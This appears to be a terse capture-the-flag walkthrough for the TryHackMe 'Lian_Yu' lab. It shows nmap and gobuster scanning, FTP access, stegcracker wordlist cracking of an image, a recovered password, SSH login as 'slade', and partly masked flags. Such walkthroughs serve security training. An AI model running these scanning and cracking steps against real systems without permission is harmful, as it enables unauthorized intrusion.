...
```
bibo318@parrot:~/CTFs/tryhackme/Lian_Yu$ sudo nmap -sS -sC -sV -O 10.10.70.37
...
```
bibo318@parrot:~/CTFs/tryhackme/Lian_Yu$ gobuster dir -u http://10.10.70.37/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
...
```
bibo318@parrot:~/CTFs/tryhackme/Lian_Yu$ gobuster dir -u http://10.10.70.37/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
...
```
bibo318@parrot:~/CTFs/tryhackme/Lian_Yu$ gobuster dir -u http://10.10.70.37/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
...
```
bibo318@parrot:~/CTFs/tryhackme/Lian_Yu$ ftp 10.10.70.37
...
```
bibo318@parrot:~/CTFs/tryhackme/Lian_Yu$ stegcracker aa.jpg /usr/share/wordlists/rockyou.txt
...
password
bibo318@parrot:~/CTFs/tryhackme/Lian_Yu$ unzip aa.jpg.out
Archive:  aa.jpg.out
  inflating: passwd.txt
  inflating: shado
bibo318@parrot:~/CTFs/tryhackme/Lian_Yu$ cat shado
M3tahuman
bibo318@parrot:~/CTFs/tryhackme/Lian_Yu$
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Lian_Yu$ ssh slade@10.10.70.37
...
THM{V0N318*****P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak

slade@LianYu:~$
```

`THM{V0N318*****P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T12**123:))}`
...
THM{V0N318*****MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE
...
`THM{V0N318*****MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D12**123:))}`
